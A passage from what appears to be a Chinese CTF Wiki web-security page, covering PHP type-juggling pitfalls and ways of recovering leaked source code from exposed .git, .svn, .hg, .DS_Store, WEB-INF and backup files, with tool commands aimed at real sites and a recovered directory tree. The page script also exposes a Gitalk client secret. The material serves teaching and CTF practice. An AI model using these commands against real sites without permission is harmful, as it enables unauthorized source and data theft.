<p>PHP 手册中的 md5（）函数的描述是 <code>string md5 ( string $str [, bool $raw_output = false ] )</code>，<code>md5()</code> 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，<code>md5()</code> 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。</p>
<p><strong>strcmp()</strong></p>
<p><code>strcmp()</code> 函数在 PHP 官方手册中的描述是 <code>intstrcmp ( string $str1 ， string $str2 )</code>，需要给 <code>strcmp()</code> 传递 2 个 <code>string</code> 类型的参数。如果 <code>str1</code> 小于 <code>str2</code>，返回 -1，相等返回 0，否则返回 1。<code>strcmp()</code> 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。</p>
<p>如果传入给出 <code>strcmp()</code> 的参数是数字呢？</p>
<div class="codehilite"><pre><span></span><span class="x">$array=[1,2,3];</span>
<span class="x">var_dump(strcmp($array,&#39;123&#39;)); //null,在某种意义上null也就是相当于false。</span>
</pre></div>

<p><strong>switch()</strong></p>
<p>如果 <code>switch()</code> 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：</p>
<div class="codehilite"><pre><span></span><span class="x">$i =&quot;2abc&quot;;</span>
<span class="x">switch ($i) {</span>
<span class="x">case 0:</span>
<span class="x">case 1:</span>
<span class="x">case 2:</span>
<span class="x"> echo &quot;i is less than 3 but not negative&quot;;</span>
<span class="x"> break;</span>
<span class="x">case 3:</span>
<span class="x"> echo &quot;i is 3&quot;;</span>
<span class="x">}</span>
</pre></div>

<p>这个时候程序输出的是 <code>i is less than 3 but not negative</code> ，是由于 <code>switch()</code> 函数将 <code>$i</code> 进行了类型转换，转换结果为 2。</p>
<p><strong>in_array()</strong></p>
<p>在 PHP 手册中， <code>in_array()</code> 函数的解释是 <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> ,如果strict参数没有提供，那么 <code>in_array</code> 就会使用松散比较来判断 <code>$needle</code> 是否在 <code>$haystack</code> 中。当 strince 的值为 true 时， <code>in_array()</code> 会比较 needls 的类型和 haystack 中的类型是否相同。</p>
<div class="codehilite"><pre><span></span><span class="x">$array=[0,1,2,&#39;3&#39;];</span>
<span class="x">var_dump(in_array(&#39;abc&#39;, $array)); //true</span>
<span class="x">var_dump(in_array(&#39;1bc&#39;, $array)); //true</span>
</pre></div>

<p>可以看到上面的情况返回的都是 true，因为 <code>'abc'</code> 会转换为 0， <code>'1bc'</code> 转换为 1。</p>
<p><code>array_search()</code> 与 <code>in_array()</code> 也是一样的问题。</p>
<h2 id="_19">寻找源代码备份<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
<h3 id="hg">hg 源码泄露<a class="headerlink" href="#hg" title="Permanent link">&para;</a></h3>
<p><code>hg init</code> 时会产生 <code>.hg</code> 文件。</p>
<p><a href="https://github.com/kost/dvcs-ripper">利用工具 dvcs-ripper</a></p>
<h3 id="git">Git 源码泄露<a class="headerlink" href="#git" title="Permanent link">&para;</a></h3>
<p><code>.git</code> 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。</p>
<div class="codehilite"><pre><span></span>/.git
/.git/HEAD
/.git/index
/.git/config
/.git/description
</pre></div>

<p><a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
<div class="codehilite"><pre><span></span>python GitHack.py http://www.openssl.org/.git/
</pre></div>

<p><a href="https://github.com/WangYihang/GitHacker">GitHacker（可恢复完整 Git 仓库）</a></p>
<div class="codehilite"><pre><span></span>python GitHacker.py http://www.openssl.org/.git/
</pre></div>

<h3 id="ds_store"><code>.DS_Store</code> 文件泄露<a class="headerlink" href="#ds_store" title="Permanent link">&para;</a></h3>
<p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p>
<p><a href="https://github.com/lijiejie/ds_store_exp">利用工具 ds＿store＿exp</a></p>
<div class="codehilite"><pre><span></span>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store

hd.zj.qq.com/
└── themes
    └── galaxyw
        ├── app
        │   └── css
        │       └── style.min.css
        ├── cityData.min.js
        ├── images
        │   └── img
        │       ├── bg-hd.png
        │       ├── bg-item-activity.png
        │       ├── bg-masker-pop.png
        │       ├── btn-bm.png
        │       ├── btn-login-qq.png
        │       ├── btn-login-wx.png
        │       ├── ico-add-pic.png
        │       ├── ico-address.png
        │       ├── ico-bm.png
        │       ├── ico-duration-time.png
        │       ├── ico-pop-close.png
        │       ├── ico-right-top-delete.png
        │       ├── page-login-hd.png
        │       ├── pic-masker.png
        │       └── ticket-selected.png
        └── member
            ├── assets
            │   ├── css
            │   │   ├── ace-reset.css
            │   │   └── antd.css
            │   └── lib
            │       ├── cityData.min.js
            │       └── ueditor
            │           ├── index.html
            │           ├── lang
            │           │   └── zh-cn
            │           │       ├── images
            │           │       │   ├── copy.png
            │           │       │   ├── localimage.png
            │           │       │   ├── music.png
            │           │       │   └── upload.png
            │           │       └── zh-cn.js
            │           ├── php
            │           │   ├── action_crawler.php
            │           │   ├── action_list.php
            │           │   ├── action_upload.php
            │           │   ├── config.json
            │           │   ├── controller.php
            │           │   └── Uploader.class.php
            │           ├── ueditor.all.js
            │           ├── ueditor.all.min.js
            │           ├── ueditor.config.js
            │           ├── ueditor.parse.js
            │           └── ueditor.parse.min.js
            └── static
                ├── css
                │   └── page.css
                ├── img
                │   ├── bg-table-title.png
                │   ├── bg-tab-say.png
                │   ├── ico-black-disabled.png
                │   ├── ico-black-enabled.png
                │   ├── ico-coorption-person.png
                │   ├── ico-miss-person.png
                │   ├── ico-mr-person.png
                │   ├── ico-white-disabled.png
                │   └── ico-white-enabled.png
                └── scripts
                    ├── js
                    └── lib
                        └── jquery.min.js

<span class="m">21</span> directories, <span class="m">48</span> files
</pre></div>

<h3 id="_20">网站备份文件<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
<p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p>
<p>常见的后缀名：</p>
<div class="codehilite"><pre><span></span>.rar
.zip
.7z
.tar
.tar.gz
.bak
.txt
</pre></div>

<h3 id="svn">SVN 泄露<a class="headerlink" href="#svn" title="Permanent link">&para;</a></h3>
<p>敏感文件：</p>
<div class="codehilite"><pre><span></span>/.svn
/.svn/wc.db
/.svn/entries
</pre></div>

<p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<div class="codehilite"><pre><span></span>perl rip-svn.pl -v -u http://www.example.com/.svn/
</pre></div>

<p><a href="http://tools.40huo.cn/#!web.md#源码泄露">Seay - SVN</a></p>
<h3 id="web-inf-webxml">WEB-INF / web.xml 泄露<a class="headerlink" href="#web-inf-webxml" title="Permanent link">&para;</a></h3>
<p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<ul>
<li><code>/WEB-INF/web.xml</code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li><code>/WEB-INF/classes/</code> ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。</li>
<li><code>/WEB-INF/lib/</code> ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li>
<li><code>/WEB-INF/src/</code> ：源码目录，按照包名结构放置各个 java 文件。</li>
<li><code>/WEB-INF/database.properties</code> ：数据库配置文件。</li>
</ul>
<p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p>
<div class="codehilite"><pre><span></span><span class="k">location</span> <span class="p">~</span> <span class="sr">^/WEB-INF/*</span> <span class="p">{</span> <span class="kn">deny</span> <span class="s">all</span><span class="p">;</span> <span class="p">}</span> <span class="c1"># 或者return 404; 或者其他！</span>
</pre></div>

<h3 id="cvs">CVS 泄露<a class="headerlink" href="#cvs" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>http://url/CVS/Root 返回根信息
http://url/CVS/Entries 返回所有文件的结构
</pre></div>

<p>取回源码</p>
<div class="codehilite"><pre><span></span>bk clone http://url/name dir
</pre></div>

<h3 id="_21">参考文献<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></li>
</ul>
                
                  
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: 'd78d2e8d782d95560289',
        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
        repo: 'comment',
        owner: 'ctf-wiki',
        admin: ['40huo', 'iromise'],
        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../ssrf-zh/" title="SSRF server request forgery" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  上一页
                </span>
                SSRF server request forgery
              </span>
            </div>
          </a>
        
        
          <a href="../../../assembly/x86-x64/readme-zh/" title="x86_x64" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  下一页
                </span>
                x86_x64
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2018 CTF Wiki Team
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.ffb616e8.js"></script>
      
        
        
          
          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
              
            
          
          
        
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../search/main.js"></script>
      
    
  </body>
</html>